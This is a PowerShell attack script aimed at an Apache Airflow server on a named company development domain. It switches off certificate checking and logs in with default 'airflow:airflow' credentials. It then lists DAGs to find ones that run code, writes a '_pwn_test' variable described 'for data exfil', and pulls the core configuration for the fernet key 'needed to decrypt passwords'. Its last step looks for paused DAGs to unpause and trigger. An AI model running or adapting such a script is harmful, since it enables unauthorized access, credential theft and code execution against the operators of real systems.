Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "POST"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR: " + $reader.ReadToEnd()
        }
        return "EXC: " + $_.Exception.Message
    }
}

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "GET"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR: " + $reader.ReadToEnd()
        }
    }
}

function AF-Patch($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "PATCH"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR: " + $reader.ReadToEnd()
        }
    }
}

# 1. Get all DAGs, find a BashOperator or PythonOperator DAG we can trigger
Write-Host "=== DAGS LIST ==="
$dags_raw = AF-Get "/api/v1/dags?limit=200&order_by=dag_id"
$dags_raw | Select-String '"dag_id"' | ForEach-Object { Write-Host $_.Line }

# 2. Check if we can create a variable (for data exfil)
Write-Host "`n=== CREATE VAR TEST ==="
$r = AF-Post "/api/v1/variables" '{"key":"_pwn_test","value":"alive"}'
Write-Host $r

# 3. Check Airflow config for fernet_key (needed to decrypt passwords)
Write-Host "`n=== CONFIG SECTION core ==="
$r2 = AF-Get "/api/v1/config?section=core"
Write-Host $r2

# 4. Trigger existing simple DAG
# First find a paused DAG and unpause it
Write-Host "`n=== FIND SMALL DAGS ==="
AF-Get "/api/v1/dags?limit=20&tags=example" | Write-Host
